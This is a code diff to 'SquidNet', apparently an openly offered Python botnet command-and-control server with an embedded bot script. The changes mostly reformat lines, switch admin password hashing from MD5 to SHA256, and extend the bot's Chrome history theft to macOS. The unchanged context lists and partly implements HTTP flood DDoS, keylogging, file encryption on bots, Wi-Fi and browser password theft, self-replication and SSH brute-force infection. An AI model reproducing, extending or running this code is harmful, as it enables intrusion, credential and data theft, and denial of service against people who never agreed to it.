@@ -1,4 +1,4 @@
-import random, socket, time, sys, threading, random, os, hashlib, datetime
+import random, socket, time, sys, threading, random, os, hashlib, datetime, sqlite3
 try:
     """This Module comes with Paramiko."""
     from cryptography.fernet import Fernet
@@ -10,6 +10,7 @@ issues with the script! I am open for DMs but please state that are a user
 of my scripts, otherwise I will ignore you(I don't accept DMs from
 strangers). My Discord: DrSquid™#7711. If you are unable to reach me,
 you can open a discussion and I will respond to that in my repository."""
+
 class ArguementParse:
     """Main Class for parsing command prompt arguements
     when running the scripts."""
@@ -23,7 +24,7 @@ class ArguementParse:
         but maybe in the future I will."""
         print("[+] Downloading Ngrok.....\n")
         if sys.platform == "win32":
-            batfile = open("getNgrok.bat","w")
+            batfile = open("getNgrok.bat", "w")
             batfile.write(f"""
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
 tar -xf {os.getcwd()}/ngrok.zip
@@ -111,7 +112,7 @@ tar -xf {os.getcwd()}/ngrok.zip
         else:
             adminuser = arg.adminuser
         if arg.adminpass is None:
-            adminpass = str(random.randint(0,99999999999999999999999999999))
+            adminpass = str(random.randint(0, 99999999999999999999999999999))
         else:
             adminpass = arg.adminpass
         if arg.key is None:
@@ -281,8 +282,7 @@ class Botnet:
             self.usage()
             self.instructor = threading.Thread(target=self.instruct)
             self.instructor.start()
-
-    def log_logo(self):
+    def log_logo(self=None):
         """Logo of this script."""
         logo = """
   _____             _     _ _   _      _            ___   ___  
@@ -304,10 +304,13 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !help                                - Displays all of the commands.")
         print("[+] !whatsnew                            - Displays all new features.")
         print("[+] !getconninfo                         - Displays info about all of the connections.")
-        print("[+] !genadminscript                      - Generates the admin script for remote connections to this server.")
-        print("[+] !genscript                           - Generates the bot python script needed to connect to this server.")
+        print(
+            "[+] !genadminscript                      - Generates the admin script for remote connections to this server.")
+        print(
+            "[+] !genscript                           - Generates the bot python script needed to connect to this server.")
         print("[+] !clear                               - Clears the output.")
-        print("[+] !togglelisten                        - Toggles whether to stop accepting connections or start accepting them.")
+        print(
+            "[+] !togglelisten                        - Toggles whether to stop accepting connections or start accepting them.")
         print("[+] !kick [hostname] [srcport]           - Kicks a client off of the Botnet.")
         print("\n[+] Commands for TCP Botnet:\n")
         print("[+] !httpflood [website] [delay]         - Denial Of Services the website provided.")
@@ -326,7 +329,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !mkfile [filename]                   - Creates a file in the bot working directory.")
         print("[+] !editfile [file]                     - Opens a file in writing mode for the bots.")
         print("[+] !stopedit                            - Closes file editor on bots and returns to normal.")
-        print("[+] !keylog [display?]                   - Sets up keylogging on the bots(put True in 2nd arg to display it, put nothing to not).")
+        print(
+            "[+] !keylog [display?]                   - Sets up keylogging on the bots(put True in 2nd arg to display it, put nothing to not).")
         print("[+] !stopkeylog                          - Stops any keylogging on the Botnet.")
         print("[+] !encdir                              - Encrypts all files in the bot working directory")
         print("[+] !decdir                              - Decrypts all files in the bot working directory")
@@ -337,14 +341,16 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !resettoken                          - Resets the token and changes it to a new token")
         print("[+] !getinfo                             - Gets the OS, cwd, IP, and username of the bots.")
         print("[+] !getip                               - Gets the IP of the bots")
-        print("[+] !getwifi                             - Obtains the wifi names and passwords of the bots(Windows only).")
+        print(
+            "[+] !getwifi                             - Obtains the wifi names and passwords of the bots(Windows only).")
         print("[+] !savefile                            - Obtains a file from the bots directory.")
         print("[+] !getcwd                              - Gets the bots working directory.")
         print("[+] !getos                               - Gets the OS Of the bots.")
         print("[+] !getpasswords                        - Gets the stored browser passwords of the bots(Windows only).")
         print("[+] !rickroll                            - Rick Rolls the Bots.")
         print("[+] !cloneself                           - Self replicates the Bot scripts in the bots.")
-        print("[+] !getchromehistory                    - Check the bots chrome history(Hehehe....)(it will save in an external file).")
+        print(
+            "[+] !getchromehistory                    - Check the bots chrome history(Hehehe....)(it will save in an external file).")
         print("\n[+] Commands for SSH Botnet:\n")
         print("[+] !infect [ip] [user]                  - Brute forces login for the provided ip and username.")
         print("[+] !inject [file]                       - Opens FTP and injects a file into an infected host.")
@@ -361,14 +367,14 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             username_password = username_password.split()
             self.admin_name = username_password[0]
             self.admin_password = username_password[1]
-            if hashlib.md5(self.admin_password.encode()).hexdigest() != hashlib.md5(
+            if hashlib.sha256(self.admin_password.encode()).hexdigest() != hashlib.sha256(
                     self.passw.encode()).hexdigest() or self.admin_name != self.name:
                 raise self.NotSamePassException
             admin_file.close()
         except:
             admin_file = open('admin.txt', 'w')
             self.admin_name = self.name
-            self.admin_password = hashlib.md5(self.passw.encode()).hexdigest()
+            self.admin_password = hashlib.sha256(self.passw.encode()).hexdigest()
             admin_contents = f"{self.name} {self.admin_password}"
             admin_file.write(admin_contents)
         try:
@@ -456,10 +462,10 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.serverlog.write(contents)
             self.serverlog.write(msg)
             self.serverlog.close()
-    def wrap_item(self, word,size):
+    def wrap_item(self, word, size):
         """Wraps the items from the conn-list and aligns it in the table."""
         item = word
-        while len(item)+2 <= size-1:
+        while len(item) + 2 <= size - 1:
             item += " "
         return item
     def gen_conntable(self):
@@ -476,7 +482,7 @@ ________________________________________________________________________________
             result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}| {self.wrap_item(split_info[3], 15)}| {self.wrap_item(split_info[4], 12)}|"
         result += "\n|_______________________|__________________|______________|______________|___________|"
         result += """
-        
+
 Admin Connections:
 ______________________________________________________________________________________
 |                       |                  |              |              |           |
@@ -530,7 +536,7 @@ ________________________________________________________
                                 self.log(f"\n[(ERROR)]: {str(e)}")
                         self.conn_list.append(c)
                     else:
-                        c.send("Access Denied.".encode())
+                        print(f"[!] WARNING: {hostname} IS NOT PART OF THE BOTNET.\n[!] Closing Connection.....")
                         c.close()
                         break
                 if isbot:
@@ -544,7 +550,7 @@ ________________________________________________________
                                     passw = passw.encode()
                                 except Exception as e:
                                     self.log(f"\n[(ERROR)]: {str(e)}")
-                                hashed_passw = hashlib.md5(passw).hexdigest()
+                                hashed_passw = hashlib.sha256(passw).hexdigest()
                                 if hashed_passw == self.admin_password and name == self.admin_name:
                                     try:
                                         admin = True
@@ -667,8 +673,10 @@ ________________________________________________________
                                 bruteforcer = threading.Thread(target=self.ssh_infect, args=(ip, username))
                                 bruteforcer.start()
                             else:
-                                c.send("[(SERVER)]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!".encode())
-                                self.log(f"\n[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
+                                c.send(
+                                    "[(SERVER)]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!".encode())
+                                self.log(
+                                    f"\n[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
                         elif msg.startswith("!keylog"):
                             msg_split = msg.split()
                             try:
@@ -676,7 +684,8 @@ ________________________________________________________
                             except:
                                 self.displaykeys = False
                             self.log("\n[(SERVER)]: Started Keylogging on the bots.")
-                            c.send(f"[(SERVER)]: Set displaying Key-inputs to the server to: {self.displaykeys}".encode())
+                            c.send(
+                                f"[(SERVER)]: Set displaying Key-inputs to the server to: {self.displaykeys}".encode())
                         elif msg.startswith("!stopkeylog"):
                             self.log("\n[(SERVER)]: Stopped Keylogging on the bots.")
                         elif msg.startswith("!sshlogin"):
@@ -684,10 +693,10 @@ ________________________________________________________
                             ip = msg_split[1]
                             username = msg_split[2]
                             password = msg_split[3]
-                            login = threading.Thread(target=self.ssh_login,args=(ip, username, password))
+                            login = threading.Thread(target=self.ssh_login, args=(ip, username, password))
                             login.start()
                         elif msg.startswith("!getconninfo"):
-                            c.send(str("[(SERVER)]:\n"+self.gen_conntable()).encode())
+                            c.send(str("[(SERVER)]:\n" + self.gen_conntable()).encode())
                             self.log(f"\n[(SERVER)---->({hostname})]:\n{self.gen_conntable()}")
                         elif msg.startswith("!inject"):
                             msg_split = msg.split()
@@ -765,11 +774,14 @@ ________________________________________________________
                             except Exception as e:
                                 self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
             except Exception as e:
-                if "a bytes-like object is required, not 'str'" in str(e) or "An operation was attempted on something that is not a socket" in str(e) or "startswith first arg must be bytes or a tuple of bytes, not str" in str(e):
+                if "a bytes-like object is required, not 'str'" in str(
+                        e) or "An operation was attempted on something that is not a socket" in str(
+                        e) or "startswith first arg must be bytes or a tuple of bytes, not str" in str(e):
                     self.log(f"\n[(ERROR)]: Ignoring Error {e} in {hostname}")
                 else:
-                    self.log(f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
-                    print(f"\n[+] {hostname} seems defective.\n[+] Closing connection....\n")
+                    self.log(
+                        f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
+                    print(f"\n[!] {hostname} seems defective.\n[!] Closing connection....\n")
                     c.close()
                     break
     def ssh_login(self, ip, username, password):
@@ -800,7 +812,8 @@ ________________________________________________________
                     admin.send(msgtoadmin.encode())
                 except:
                     pass
-            print(f"\n[!] Successfully logged into {username}@{ip} with {password}!\n[!] Adding {username}@{ip} to the botnet.\n")
+            print(
+                f"\n[!] Successfully logged into {username}@{ip} with {password}!\n[!] Adding {username}@{ip} to the botnet.\n")
         except Exception as e:
             print(f"[+] Unable to login to {ip}@{username}\n[+] Try using different credentials.")
             msgtoadmin = f"[(SERVER)]: Unable to log into {username}@{ip} due to: {e}"
@@ -833,7 +846,7 @@ ________________________________________________________
                 self.ips.append(ip)
                 self.display_bots.append(f"{username}@{ip}")
                 self.ssh_bots.append(client)
-                self.ssh_info.append(str(username)+" "+str(ip)+" "+str(passw))
+                self.ssh_info.append(str(username) + " " + str(ip) + " " + str(passw))
                 self.ssh_botlist.append(str(client) + ' ' + str(username))
                 msgtoadmin = f"[(SERVER)]: {ip}'s Password has been found!: {passw}\n[(SERVER)] Adding {username}@{ip} to the botnet.\n"
                 self.log('\n' + msgtoadmin)
@@ -965,9 +978,10 @@ ________________________________________________________
                         print("[+] Invalid Parameters!\n")
                 elif self.instruction.startswith("!getchromehistory"):
                     self.obtaininghistory = True
-                    print("[+] Obtaining Bot Chrome history. It is highly suggested you do not give any commands at the moment.")
+                    print(
+                        "[+] Obtaining Bot Chrome history. It is highly suggested you do not give any commands at the moment.")
                     print("[+] Please wait 10 seconds before doing anything.")
-                    self.historyfile = open("BotsHistory.txt","wb")
+                    self.historyfile = open("BotsHistory.txt", "wb")
                     print("[+] File with Bot Chrome History: BotsHistory.txt")
                     resetter = threading.Thread(target=self.reset_historyvar)
                     resetter.start()
@@ -1065,12 +1079,13 @@ ________________________________________________________
                     port = msg_split[2]
                     conntokick = ""
                     for i in self.connportlist:
-                        if host+"" in i and port+" " in i:
+                        if host + "" in i and port + " " in i:
                             conntokick = i
                             break
                     if conntokick == "":
                         print("\n[+] Hostname or port is not registered in the botnet.")
-                        self.log(f"\n[(SERVER)]: Attempted to kick {host} from source port {port} but it did not exist.")
+                        self.log(
+                            f"\n[(SERVER)]: Attempted to kick {host} from source port {port} but it did not exist.")
                     else:
                         for conn in self.conn_list:
                             if str(conn) in conntokick:
@@ -1106,6 +1121,7 @@ ________________________________________________________
 [+] - Made default admin password a random integer, rather than 'root'.
 [+] - Removed unnessecary modules.
 [+] - Chrome history obtaining is now possible on the bots ;).
+[+] - Changed hashing algorithim to sha256.
                     """)
                 if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
                     pass
@@ -1220,7 +1236,7 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         the in-built commands or run any other instructions with command prompt/terminal."""
         script = """
 #-----SquidNet-Bot-Script-----#
-import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re
+import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re, shutil
 from datetime import datetime, timedelta
 try:
     from pynput.keyboard import Listener # pip install pynput
@@ -1238,8 +1254,6 @@ try:
     from Crypto.Cipher import AES # pip install pycryptodome
 except:
     pass
-import shutil
-
 class DDoS:
     def __init__(self, ip, delay):
         self.ip = ip
@@ -4572,7 +4586,13 @@ class Bot:
         self.ip = ip
         self.port = port
         self.msg = ""
-        self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
+        self.name = os.popen("whoami").read().strip()
+        if sys.platform == "win32":
+            self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
+        elif sys.platform == "darwin":
+            self.desktop = f"/Users/{self.name}/Desktop"
+        else:
+            self.desktop = f"/"
         self.logging = False
         self.file_saving = False
         while True:
@@ -4882,7 +4902,7 @@ OS:       {sys.platform}
             os.system(f'start {website}')
         else:
             os.system(f'open {website}')
-    
+
     def clone(self):
         file_ending = sys.argv[0].split(".")
         file_ending = file_ending[len(file_ending) - 1]
@@ -4907,7 +4927,7 @@ OS:       {sys.platform}
         if sys.platform == "win32":
             main_dir = f"C:/Users/{os.getlogin()}/"
         else:
-            main_dir = f"/Users/{sys.argv[0].split('/')[1]}/"
+            main_dir = f"/Users/{self.name}/"
         os.chdir(main_dir)
         workingdirs = []
         workingdirs.append(main_dir)
@@ -4959,7 +4979,10 @@ OS:       {sys.platform}
             os.system(f'open {website}')
     def send_history(self):
         dirs = os.getcwd()
-        os.chdir(f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/")
+        if sys.platform == "win32":
+            os.chdir(f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/")
+        elif sys.platform == "darwin":
+            os.chdir(f"/Users/{self.name}/Library/Application Support/Google/Chrome/User Data/Default/")
         shutil.copyfile("History", dirs + "/History.db")
         os.chdir(dirs)
         History = sqlite3.connect("History.db")
@@ -5204,8 +5227,10 @@ class Web_Interface:
                         2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[4] + "</td>\n</tr>\n"
                 conn_admin = ""
                 for x in botnet.botnet.admininfo:
-                    conn_admin += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
-                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[4] + "</td>\n</tr>\n"
+                    conn_admin += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + \
+                                  x.split()[
+                                      2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>" + x.split()[
+                                      4] + "</td>\n</tr>\n"
                 conn_ssh = ""
                 for x in botnet.botnet.ssh_info:
                     conn_ssh += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
@@ -5222,15 +5247,15 @@ class Web_Interface:
                             font-size: 50px
                             border-collapse: collapse;
                             font: arial;
-    
+
                         }
-    
+
                         td, th {
                             border: 1px solid black;
                             padding: 5px;
-    
+
                         }
-    
+
                     </style>
                 </head>
                 <body>
@@ -5328,8 +5353,7 @@ if __name__ == '__main__':
     except:
         """Since paramiko is not an official Python Module,
         the user may need to download Paramiko themself."""
-        Botnet.logo(None)
+        print(Botnet.log_logo())
         print("\n[+] Missing Module: Paramiko\n[+] If you have python 3 installed, try: pip install paramiko")
-        input("[+] Press 'Enter' to exit.")
         sys.exit()
     botnet = ArguementParse()
